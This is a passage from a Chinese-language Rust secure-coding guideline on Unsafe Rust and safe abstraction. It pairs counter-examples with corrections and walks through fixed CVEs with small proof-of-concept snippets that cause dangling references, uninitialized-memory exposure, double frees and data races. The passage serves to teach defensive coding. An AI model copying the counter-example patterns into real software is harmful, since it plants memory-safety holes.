<p>Unsafe Rust 有其应用范围和目标，不要为了逃避 编译器安全检查而随便滥用 Unsafe Rust，否则很可能引起未定义行为（UB）。</p>
<p>【反例】</p>
<pre><pre class="playground"><code class="language-rust">// 该函数为滥用 unsafe 来跳过 Rust 借用检查 
// 强行返回本地变量的引用，最终引起 UB 未定义行为
fn abuse_unsafe_return_local_ref&lt;'a&gt;() -&gt; &amp;'a String {
    let s = &quot;hello&quot;.to_string();
    let ptr_s_addr = &amp;s as *const String as usize;
    unsafe{ &amp;*(ptr_s_addr as *const String) }
}

fn main() {
    let s = abuse_unsafe_return_local_ref(); // error: Undefined Behavior: encountered a dangling reference (use-after-free)
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="puns02--不要为了提升性能而盲目使用-unsafe-rust"><a class="header" href="#puns02--不要为了提升性能而盲目使用-unsafe-rust">P.UNS.02  不要为了提升性能而盲目使用 Unsafe Rust</a></h2>
<p><strong>【描述】</strong></p>
<p>对比 Safe 代码的性能看是否够用，就可以减少不必要的 Unsafe。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="guns01--不宜为带有-unsafe-命名的类型或方法创建别名"><a class="header" href="#guns01--不宜为带有-unsafe-命名的类型或方法创建别名">G.UNS.01  不宜为带有 <code>unsafe</code> 命名的类型或方法创建别名</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 里  <code>unsafe</code> 字样用于提醒开发者在编写代码的时候注意保证安全。如果修改别名，隐藏了这种提醒，不利于展示这种信息。</p>
<p>不利于开发者去保证安全。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::cell::{UnsafeCell as TotallySafeCell};

extern crate crossbeam;
use crossbeam::{spawn_unsafe as spawn};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::cell::{UnsafeCell};

extern crate crossbeam;
use crossbeam::{spawn_unsafe};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#unsafe_removed_from_name">unsafe_removed_from_name</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="安全抽象规范"><a class="header" href="#安全抽象规范">安全抽象规范</a></h1>
<p>使用 Unsafe Rust 的一种方式是将 Unsafe 的方法或函数进行安全抽象，将其变成安全的方法或函数。</p>
<p>Unsafe Rust 中 API 的安全性设计通常有两种方式：</p>
<ol>
<li>将内部的 unsafe API 直接暴露给 API 的使用者，并且使用 <code>unsafe</code> 关键字来声明该 API 是非安全的，同时也需要对安全边界条件添加注释。</li>
<li>对 API 进行安全封装，即，安全抽象。在内部使用断言来保证当越过安全边界时可以 Panic，从而避免 UB 产生。</li>
</ol>
<p>第二种方式，对 Unsafe 代码进行安全抽象，是 Rust 生态的一种约定俗成。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas01--代码中要注意是否会因为-panic-发生而导致内存安全问题"><a class="header" href="#punssas01--代码中要注意是否会因为-panic-发生而导致内存安全问题">P.UNS.SAS.01  代码中要注意是否会因为 Panic 发生而导致内存安全问题</a></h2>
<p><strong>【描述】</strong></p>
<p>Panic 一般在程序达到不可恢复的状态才用，当然在 Rust 中也可以对一些实现了<code>UnwindSafe</code> trait 的类型捕获Panic。</p>
<p>当 Panic 发生时，会引发栈回退（stack unwind），调用栈分配对象的析构函数，并将控制流转移给 Panic 处理程序中。所以，当 Panic 发生的时候，当前存活变量的析构函数将会被调用，从而导致一些内存安全问题，比如释放已经释放过的内存。</p>
<p>通常， 封装的 Unsafe 代码可能会暂时绕过所有权检查，而且，安全封装的 API 在内部 unsafe 代码的值返回之前，会根据安全边界条件确保它不会违反安全规则。但是，假如封装的 Unsafe 代码发生了Panic，则其外部安全检查可能不会执行。这很可能导致类似 C/C++ 中 未初始化（Uninitialized ）或双重释放（Double Free）的内存不安全问题。</p>
<p>想要正确的推理在 Unsafe 代码中的恐慌安全，是非常困难且易于出错的。即便如此，在编写代码的时候也要刻意注意此类问题发生的可能性。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 标准库 `String::retain()` 曝出的 CVE-2020-36317 Panic safety bug

pub fn retain&lt;F&gt;(&amp;mut self, mut f: F)
where 
    F: FnMut(char) -&gt; bool
{
    let len = self.len();
    let mut del_bytes = 0;
 	let mut idx = 0;
 
    unsafe { self.vec.set_len(0); }    // + 修复bug 的代码
 	while idx &lt; len {
 		let ch = unsafe {
  			self.get_unchecked(idx..len).chars().next().unwrap()
 		};
 		let ch_len = ch.len_utf8();
 
 		// self is left in an inconsistent state if f() panics
        // 此处如果 f() 发生了 Panic，self 的长度就会不一致
 		if !f(ch) {
 			del_bytes += ch_len;
 		} else if del_bytes &gt; 0 {
 			unsafe {
 				ptr::copy(self.vec.as_ptr().add(idx),
 				self.vec.as_mut_ptr().add(idx - del_bytes),
 				ch_len);
 			}
 		}
 		idx += ch_len; // point idx to the next char
 	}
 	unsafe { self.vec.set_len(len - del_bytes); } // + 修复bug 的代码 ，如果 while 里发生 Panic，则将返回长度设置为 0 
}

fn main(){
    // PoC: creates a non-utf-8 string in the unwinding path
    // 此处传入一个 非 UTF-8 编码字符串引发 Panic
    &quot;0è0&quot;.to_string().retain(|_| {
        match the_number_of_invocation() {
            1 =&gt; false,
            2 =&gt; true,
            _ =&gt; panic!(),
        }
    });
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas02--unsafe-代码编写者有义务检查代码是否满足安全不变式"><a class="header" href="#punssas02--unsafe-代码编写者有义务检查代码是否满足安全不变式">P.UNS.SAS.02  Unsafe 代码编写者有义务检查代码是否满足安全不变式</a></h2>
<p><strong>【描述】</strong></p>
<p>安全不变式（见 <a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/./glossary.html">Unsafe 代码术语指南</a> ）是 Rust 里的安全函数，在任何有效输入的情况下，都不应该发生任何未定义行为。</p>
<p>可以从以下三个方面来检查：</p>
<ol>
<li>逻辑一致性。</li>
<li>纯洁性。相同的输入总是要返回相同的输出。</li>
<li>语义约束。传入的参数要合法，满足数据类型。</li>
</ol>
<p><strong>【正例】</strong></p>
<p>该代码是为 <code>Borrow&lt;str&gt;</code> 实现 join 方法内部调用的一个函数 <code>join_generic_copy</code> 的展示。 在 <code>join_generic_copy</code> 内部，会对 <code>slice</code> 进行两次转换，而在 <code>spezialize_for_lengths!</code> 宏内部，调用了 <code>.borrow()</code> 方法，如果第二次转换和第一次不一样，而会返回一个未初始化字节的字符串。</p>
<p>这里， <code>Borrow&lt;B&gt;</code> 是高阶类型，它内部 <code>borrow</code> 的一致性其实并没有保证，可能会返回不同的 slice，如果不做处理，很可能会暴露出未初始化的字节给调用者。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// CVE-2020-36323: a higher-order invariant bug in join()
fn join_generic_copy&lt;B, T, S&gt;(slice: &amp;[S], sep: &amp;[T]) -&gt; Vec&lt;T&gt; 
where T: Copy, B: AsRef&lt;[T]&gt; + ?Sized, S: Borrow&lt;B&gt;
{
    let mut iter = slice.iter();

    // `slice`is converted for the first time
    // during the buffer size calculation.
    let len = ...;  // `slice` 在这里第一次被转换	
    let mut result = Vec::with_capacity(len);
    // ...
    unsafe {
        let pos = result.len();
        let target = result.get_unchecked_mut(pos..len);
 
        // `slice`is converted for the second time in macro
        // while copying the rest of the components.
        spezialize_for_lengths!(sep, target, iter; // `slice` 第二次被转换
        0, 1, 2, 3, 4);
 
        // Indicate that the vector is initialized
        result.set_len(len);
    }
    result
}

// PoC: a benign join() can trigger a memory safety issue
impl Borrow&lt;str&gt; for InconsistentBorrow {
    fn borrow(&amp;self) -&gt; &amp;str {
        if self.is_first_time() {
            &quot;123456&quot;
        } else {
            &quot;0&quot;
        }
    }
}

let arr: [InconsistentBorrow; 3] = Default::default();
arr.join(&quot;-&quot;);
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas03--不要随便在公开的-api-中暴露未初始化内存"><a class="header" href="#punssas03--不要随便在公开的-api-中暴露未初始化内存">P.UNS.SAS.03  不要随便在公开的 API 中暴露未初始化内存</a></h2>
<p><strong>【描述】</strong></p>
<p>在公开的API中暴露未初始化内存可能导致 未定义行为。
关于未定义行为，可以参考<a href="safe-guides/coding_practice/unsafe_rust/safe_abstract/./glossary.html">Unsafe 代码术语指南</a>。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 以下是有安全风险的代码示例：
impl&lt;R&gt; BufRead for GreedyAccessReader&lt;R&gt;
    where
        R: Read,
{
    fn fill_buf(&amp;mut self) -&gt; IoResult&lt;&amp;[u8]&gt; {
        if self.buf.capacity() == self.consumed {
            self.reserve_up_to(self.buf.capacity() + 16);
        }

        let b = self.buf.len();
        let buf = unsafe {
            // safe because it's within the buffer's limits
            // and we won't be reading uninitialized memory
            // 这里虽然没有读取未初始化内存，但是会导致用户读取
            std::slice::from_raw_parts_mut(
                self.buf.as_mut_ptr().offset(b as isize),
                self.buf.capacity() - b)
        };

        match self.inner.read(buf) {
            Ok(o) =&gt; {
                unsafe {
                    // reset the size to include the written portion,
                    // safe because the extra data is initialized
                    self.buf.set_len(b + o);
                }

                Ok(&amp;self.buf[self.consumed..])
            }
            Err(e) =&gt; Err(e),
        }
    }

    fn consume(&amp;mut self, amt: usize) {
        self.consumed += amt;
    }
}

// 另外一个漏洞代码
fn read_vec(&amp;mut self) -&gt; Result&lt;Vec&lt;u8&gt;&gt; {
    let len: u32 = de::Deserialize::deserialize(&amp;mut *self)?;
    // 创建了未初始化buf
    let mut buf = Vec::with_capacity(len as usize);
    unsafe { buf.set_len(len as usize) }
    self.read_size(u64::from(len))?;
    // 将其传递给了用户提供的`Read`实现
    self.reader.read_exact(&amp;mut buf[..])?;
    Ok(buf)
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 修正以后的代码示例，去掉了未初始化的buf：
impl&lt;R&gt; BufRead for GreedyAccessReader&lt;R&gt;
    where
        R: Read,
{
    fn fill_buf(&amp;mut self) -&gt; IoResult&lt;&amp;[u8]&gt; {
        if self.buf.capacity() == self.consumed {
            self.reserve_up_to(self.buf.capacity() + 16);
        }

        let b = self.buf.len();
        self.buf.resize(self.buf.capacity(), 0);
        let buf = &amp;mut self.buf[b..];
        let o = self.inner.read(buf)?;

        // truncate to exclude non-written portion
        self.buf.truncate(b + o);

        Ok(&amp;self.buf[self.consumed..])
    }

    fn consume(&amp;mut self, amt: usize) {
        self.consumed += amt;
    }
}

// 另外一个已修正漏洞的代码
fn read_vec(&amp;mut self) -&gt; Result&lt;Vec&lt;u8&gt;&gt; {
    let len: u32 = de::Deserialize::deserialize(&amp;mut *self)?;
    // 创建了未初始化buf
    let mut buf = Vec::with_capacity(len as usize);
    // 初始化为 0；
    buf.resize(len as usize, 0);
    self.read_size(u64::from(len))?;
    // 将其传递给了用户提供的`Read`实现
    self.reader.read_exact(&amp;mut buf[..])?;
    Ok(buf)
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas04-避免因为-panic-safety-而导致双重释放"><a class="header" href="#punssas04-避免因为-panic-safety-而导致双重释放">P.UNS.SAS.04 避免因为 Panic Safety 而导致双重释放</a></h2>
<p><strong>【描述】</strong></p>
<p>要注意 Panic Safety 的情况，避免双重释放（double free）的问题发生。</p>
<p>在使用 <code>std::ptr</code> 模块中接口需要注意，容易产生 UB 问题，要多多查看 API 文档。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>//case 1
macro_rules! from_event_option_array_into_event_list(
    ($e:ty, $len:expr) =&gt; (
        impl&lt;'e&gt; From&lt;[Option&lt;$e&gt;; $len]&gt; for EventList {
                fn from(events: [Option&lt;$e&gt;; $len]) -&gt; EventList {
                    let mut el = EventList::with_capacity(events.len());
                    for idx in 0..events.len() {
                    // 这个 unsafe 用法在 `event.into()`调用 panic 的时候会导致双重释放
                        let event_opt = unsafe { ptr::read(events.get_unchecked(idx)) };
                        if let Some(event) = event_opt { el.push::&lt;Event&gt;(event.into()); }
                    }
                    // 此处 mem::forget 就是为了防止 `dobule free`。
                    // 因为 `ptr::read` 也会制造一次 drop。
                    // 所以上面如果发生了 panic，那就相当于注释了 `mem::forget`，导致 `dobule free`
                    mem::forget(events);
                    el
                }
        }
    )
);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>macro_rules! from_event_option_array_into_event_list(
    ($e:ty, $len:expr) =&gt; (
        impl&lt;'e&gt; From&lt;[Option&lt;$e&gt;; $len]&gt; for EventList {
            fn from(events: [Option&lt;$e&gt;; $len]) -&gt; EventList {
                let mut el = ManuallyDrop::new(
                    EventList::with_capacity(events.len())
                );

                for idx in 0..events.len() {
                    let event_opt = unsafe {
                        ptr::read(events.get_unchecked(idx))
                    };

                    if let Some(event) = event_opt {
                        // Use `ManuallyDrop` to guard against
                        // potential panic within `into()`.
                        // 当 into 方法发生 panic 当时候，这里 ManuallyDrop 可以保护其不会`double free`
                        let event = ManuallyDrop::into_inner(
                            ManuallyDrop::new(event)
                            .into()
                        );
                        el.push(event);
                    }
                }
                mem::forget(events);
                ManuallyDrop::into_inner(el)
            }
        }
    )
);
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas05--手动实现-auto-trait-时要充分考虑其安全性"><a class="header" href="#punssas05--手动实现-auto-trait-时要充分考虑其安全性">P.UNS.SAS.05  手动实现 auto trait 时要充分考虑其安全性</a></h2>
<p><strong>【描述】</strong></p>
<p>所谓 auto trait 是指 Safe Rust中由编译器自动实现的 trait，比如 <code>Send/Sync</code> 。在 Unsafe Rust中就需要手动实现这俩 trait 了。</p>
<p>所以，在手动实现的时候要充分考虑其安全性。</p>
<p><strong>【正例】</strong></p>
<p>Rust futures 库中发现的问题，错误的手工 <code>Send/Sync</code> 实现 破坏了线程安全保证。</p>
<p>受影响的版本中，<code>MappedMutexGuard</code> 的 <code>Send/Sync</code> 实现只考虑了 <code>T</code> 上的差异，而 <code>MappedMutexGuard</code> 则取消了对 <code>U</code> 的引用。</p>
<p>当 <code>MutexGuard::map()</code> 中使用的闭包返回与 <code>T</code> 无关的 <code>U</code> 时，这可能导致安全 Rust 代码中的数据竞争。</p>
<p>这个问题通过修正 <code>Send/Sync</code> 的实现，以及在 <code>MappedMutexGuard</code> 类型中添加一个 <code>PhantomData&lt;&amp;'a mut U&gt;</code> 标记来告诉编译器，这个防护也是在 U 之上。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// CVE-2020-35905: incorrect uses of Send/Sync on Rust's futures
pub struct MappedMutexGuard&lt;'a, T: ?Sized, U: ?Sized&gt; {
    mutex: &amp;'a Mutex&lt;T&gt;,
    value: *mut U,
    _marker: PhantomData&lt;&amp;'a mut U&gt;, // + 修复代码
}

impl&lt;'a, T: ?Sized&gt; MutexGuard&lt;'a, T&gt; {
    pub fn map&lt;U: ?Sized, F&gt;(this: Self, f: F)
        -&gt; MappedMutexGuard&lt;'a, T, U&gt;
        where F: FnOnce(&amp;mut T) -&gt; &amp;mut U {
            let mutex = this.mutex;
            let value = f(unsafe { &amp;mut *this.mutex.value.get() });
                mem::forget(this);
                // MappedMutexGuard { mutex, value }
                MappedMutexGuard { mutex, value, _marker: PhantomData } //  + 修复代码
    }
}

// unsafe impl&lt;T: ?Sized + Send, U: ?Sized&gt; Send
unsafe impl&lt;T: ?Sized + Send, U: ?Sized + Send&gt; Send // + 修复代码
for MappedMutexGuard&lt;'_, T, U&gt; {}
//unsafe impl&lt;T: ?Sized + Sync, U: ?Sized&gt; Sync
unsafe impl&lt;T: ?Sized + Sync, U: ?Sized + Sync&gt; Sync // + 修复代码
for MappedMutexGuard&lt;'_, T, U&gt; {}

// PoC: this safe Rust code allows race on reference counter
* MutexGuard::map(guard, |_| Box::leak(Box::new(Rc::new(true))));
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas06--不要随便在公开的-api-中暴露裸指针"><a class="header" href="#punssas06--不要随便在公开的-api-中暴露裸指针">P.UNS.SAS.06  不要随便在公开的 API 中暴露裸指针</a></h2>
<p><strong>【描述】</strong></p>
<p>在公开的API中暴露裸指针，可能会被用户修改为空指针，从而有段错误风险。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use cache;


/**

    `cache crate` 内部代码：

    ```rust
    pub enum Cached&lt;'a, V: 'a&gt; {
        /// Value could not be put on the cache, and is returned in a box
        /// as to be able to implement `StableDeref`
        Spilled(Box&lt;V&gt;),
        /// Value resides in cache and is read-locked.
        Cached {
            /// The readguard from a lock on the heap
            guard: RwLockReadGuard&lt;'a, ()&gt;,
            /// A pointer to a value on the heap
            // 漏洞风险
            ptr: *const ManuallyDrop&lt;V&gt;,
        },
        /// A value that was borrowed from outside the cache.
        Borrowed(&amp;'a V),
    }
**/
fn main() {
    let c = cache::Cache::new(8, 4096);
    c.insert(1, String::from(&quot;test&quot;));
    let mut e = c.get::&lt;String&gt;(&amp;1).unwrap();

    match &amp;mut e {
        cache::Cached::Cached { ptr, .. } =&gt; {
            // 将 ptr 设置为 空指针，导致段错误
            *ptr = std::ptr::null();
        },
        _ =&gt; panic!(),
    }
    // 输出：3851，段错误
    println!(&quot;Entry: {}&quot;, *e);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas07--在抽象安全方法的同时也建议为性能考虑而增加相应的-unsafe-方法"><a class="header" href="#punssas07--在抽象安全方法的同时也建议为性能考虑而增加相应的-unsafe-方法">P.UNS.SAS.07  在抽象安全方法的同时，也建议为性能考虑而增加相应的 Unsafe 方法</a></h2>
<p><strong>【描述】</strong></p>
<p>在 Rust 标准库中有很多后缀有 <code>_unchecked</code> 的方法，都对应一个没有该后缀的同名方法，比如 <code>get() / get_unchecked()</code>。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>/// 假如调用环境可以保证地址是非空，那么可以使用这个 &quot;_unchecked&quot; 的函数
#[inline(always)]
unsafe fn io_read_u32_unchecked(ioaddr: usize) -&gt; u32 {
    let val = ptr::read_volatile(ioaddr as *const u32);
    trace!(&quot;io_read_u32 {:#x}={:#x}&quot;, ioaddr, val);
    val
}

/// 安全抽象版本
#[inline(always)]
fn io_read_u32() -&gt; Result&lt;u32, MyError&gt; {
    let ioaddr = ioaddr as * const u32;
    if ioaddr.is_null() {
        return Err(MyError::Content(&quot;io_read_u32 addr is null!&quot;));
    }
    unsafe {
        let val = ptr::read_volatile(ioaddr);
        trace!(&quot;io_read_u32 {:#x}={:#x}&quot;, ioaddr, val);
        ok(val)
    }
}   
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas08--函数参数是不可变借用的时候返回值不应该是可变借用"><a class="header" href="#punssas08--函数参数是不可变借用的时候返回值不应该是可变借用">P.UNS.SAS.08  函数参数是不可变借用的时候，返回值不应该是可变借用</a></h2>
<p><strong>【描述】</strong></p>
<p>即便函数签名中没有 <code>unsafe</code>，但开发者无法保证它函数头部实现中不含 Unsafe代码。</p>
<p>当通过 Unsafe 安全抽象一个函数的时候，要注意符合规则中描述的签名约定：不能输入一个不可变借用，返回一个可变的，这是违反 Rust安全准则的。</p>
<p>当然，当函数被标识为 <code>unsafe</code> 时，是允许这种情况的。</p>
<p><strong>【反例】</strong></p>
<p>这个来自 Rust 官方的一个示例，这样的签名导致 Rust 出现了一个严重 bug，<a href="https://github.com/rust-lang/rust/issues/39465">来源</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 该函数未加 unsafe，被认为是安全的
// 但是函数签名违反了 Rust 的安全规则，不应该不可变借用进去，可变借用返回
pub fn as_mut_slice(&amp;self) -&gt; &amp;mut [T] {
    unsafe {
        slice::from_raw_parts_mut(self.ptr as *mut T, self.len())
    }
}    
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 修正以后的代码：https://github.com/rust-lang/rust/pull/39466/files
pub fn as_mut_slice(&amp;mut self) -&gt; &amp;mut [T] {
    unsafe {
        slice::from_raw_parts_mut(self.ptr as *mut T, self.len())
    }
} 
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://docs.rs/crate/wasmer/2.0.0/source/src/externals/memory.rs

/// Retrieve a mutable slice of the memory contents.
///
/// # Safety
///
/// This method provides interior mutability without an UnsafeCell. Until
/// the returned value is dropped, it is undefined behaviour to read or
/// write to the pointed-to memory in any way except through this slice,
/// including by calling a wasm function that reads the memory contents or
/// by resizing this Memory.
// 这里为 unsafe 函数，则允许这种情况
#[allow(clippy::mut_from_ref)]
pub unsafe fn data_unchecked_mut(&amp;self) -&gt; &amp;mut [u8] {
	let definition = self.vm_memory.from.vmmemory();
	let def = definition.as_ref();
	slice::from_raw_parts_mut(def.base, def.current_length.try_into().unwrap())
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punssas09-在任何-unsafe-块之前都应该加-safety-注释"><a class="header" href="#punssas09-在任何-unsafe-块之前都应该加-safety-注释">P.UNS.SAS.09 在任何 Unsafe 块之前都应该加 <code>SAFETY</code> 注释</a></h2>
<p><strong>【描述】</strong></p>
<p>在任何 unsafe 块（即 <code>unsafe {...}</code>）之前都应该加 <code># SAFETY</code> 注释，用于表明 Unsafe 块里面的代码为什么是正确的。并且 <code># SAFETY</code> 是全大写，注意区分与文档注释中 <code># Safety</code> 的用法。</p>
<p>虽然有时原因可能看起来微不足道或很明显，但编写这些注释不仅是记录所考虑内容的好方法，而且最重要的是，它提供了一种知道没有额外隐含约束的方法。</p>
<p><strong>【反例】</strong></p>
<p>未在 unsafe 块之前增加 <code># SAFETY</code> 注释。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>// 注意这里 Safety 是用于文档注释，用于说明 unsafe 方法或函数的 安全边界
/// Returns the contained [`Some`] value, consuming the `self` value,
/// without checking that the value is not [`None`].
///
/// # Safety
///
/// Calling this method on [`None`] is *[undefined behavior]*.
///
/// [undefined behavior]: https://doc.rust-lang.org/reference/behavior-considered-undefined.html
///
/// # Examples
///
/// ```
/// let x = Some(&quot;air&quot;);
/// assert_eq!(unsafe { x.unwrap_unchecked() }, &quot;air&quot;);
/// ```
pub unsafe fn unwrap_unchecked(self) -&gt; T {
        match self {
                Some(val) =&gt; val,
                // 这里存在一个 Unsafe block ，应该为其增加 SAFETY 注释来说明其
                // 但是现在没有相关注释
                None =&gt; unsafe { hint::unreachable_unchecked() },
        }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>已在 unsafe 块之前增加 <code># SAFETY</code> 注释。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>// 注意这里 Safety 是用于文档注释，用于说明 unsafe 方法或函数的 安全边界
/// Returns the contained [`Some`] value, consuming the `self` value,
/// without checking that the value is not [`None`].
///
/// # Safety
///
/// Calling this method on [`None`] is *[undefined behavior]*.
///
/// [undefined behavior]: https://doc.rust-lang.org/reference/behavior-considered-undefined.html
///
/// # Examples
///
/// ```
/// let x = Some(&quot;air&quot;);
/// assert_eq!(unsafe { x.unwrap_unchecked() }, &quot;air&quot;);
/// ```
pub unsafe fn unwrap_unchecked(self) -&gt; T {
        match self {
                Some(val) =&gt; val,
                // 这里存在一个 Unsafe block ，为其增加 SAFETY 注释来说明其
                // SAFETY: The safety contract must be upheld by the caller.
                None =&gt; unsafe { hint::unreachable_unchecked() },
        }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gunssas01--在公开的-unsafe-函数的文档中必须增加-safety-注释"><a class="header" href="#gunssas01--在公开的-unsafe-函数的文档中必须增加-safety-注释">G.UNS.SAS.01  在公开的 unsafe 函数的文档中必须增加 Safety 注释</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>在公开（pub）的 unsafe 函数文档中，必须增加 <code># Safety</code> 注释来解释该函数的安全边界，这样使用该函数的用户才可以安全地使用它。</p>
<p>说明： 该规则通过 cargo clippy 来检测。默认会发出警告。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>    // 不符合
    /// Creates a `Vec&lt;T&gt;` directly from the raw components of another vector.
    pub unsafe fn from_raw_parts(ptr: *mut T, length: usize, capacity: usize) -&gt; Self {
        unsafe { Self::from_raw_parts_in(ptr, length, capacity, Global) }
    }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>示例来自于标准库文档： <a href="https://doc.rust-lang.org/stable/src/alloc/vec/mod.rs.html#1167">https://doc.rust-lang.org/stable/src/alloc/vec/mod.rs.html#1167</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>    // 符合
    /// Creates a `Vec&lt;T&gt;` directly from the raw components of another vector.
    ///
    /// # Safety
    ///
    /// This is highly unsafe, due to the number of invariants that aren't
    /// checked:
    ///
    /// * `ptr` needs to have been previously allocated via [`String`]/`Vec&lt;T&gt;`
    ///   (at least, it's highly likely to be incorrect if it wasn't).
    /// * `T` needs to have the same size and alignment as what `ptr` was allocated with.
    ///   (`T` having a less strict alignment is not sufficient, the alignment really
    ///   needs to be equal to satisfy the [`dealloc`] requirement that memory must be
    ///   allocated and deallocated with the same layout.)
    /// * `length` needs to be less than or equal to `capacity`.
    /// * `capacity` needs to be the capacity that the pointer was allocated with.
    pub unsafe fn from_raw_parts(ptr: *mut T, length: usize, capacity: usize) -&gt; Self {
        unsafe { Self::from_raw_parts_in(ptr, length, capacity, Global) }
    }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>默认 level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/index.html#missing_safety_doc">missing_safety_doc</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gunssas02--在-unafe-函数中应使用-assert-而非-debug_assert-去校验边界条件"><a class="header" href="#gunssas02--在-unafe-函数中应使用-assert-而非-debug_assert-去校验边界条件">G.UNS.SAS.02  在 Unafe 函数中应使用 <code>assert!</code> 而非 <code>debug_assert!</code> 去校验边界条件</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p><code>assert!</code> 宏在 Release 和 Debug 模式下都会被检查，并且不能被禁用。它通常用来在 unsafe 函数中判断传入的参数是否满足某种边界条件，以此来防止不合法的参数传入导致未定义行为。</p>
<p>但是 <code>debug_assert!</code> 则可以通过配置 <code>-C debug-assertions</code> 来禁用它， 而且 <code>debug_assert!</code> 在 Release 模式下也会被编译器优化。所以，一旦使用了 <code>debug_assert!</code> 在 unsafe 函数中用来防范不合法参数，那有可能会失效。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>    #![warn(clippy::debug_assert_with_mut_call)]
<span class="boring">fn main() {
</span>    // 不符合
	// 使用了 debug_assert! 那就说明这个校验在 Release 模式不一定有效
    // 那么该函数就要被标记为  unsafe
	pub unsafe fn split_at_mut(&amp;mut self, mid: usize) -&gt; (&amp;mut [T], &amp;mut [T]) {
        debug_assert!(mid &lt;= self.len()); // 注意，这里是 debug_assert!
        // SAFETY: `[ptr; mid]` and `[mid; len]` are inside `self`, which
        // fulfills the requirements of `from_raw_parts_mut`.
        unsafe { self.split_at_mut_unchecked(mid) }
    }

   // 不符合
   // 在 debug_assert_eq! 中包含可变引用的调用，
   // 也会因为 debug_assert_ 系列的断言宏在 Release 下产生不可预料的结果，它是 unsafe 的
   debug_assert_eq!(vec![3].pop(), Some(3));
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>来自标准库 <code>slice</code> 的代码示例。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>    #![warn(clippy::debug_assert_with_mut_call)]
<span class="boring">fn main() {
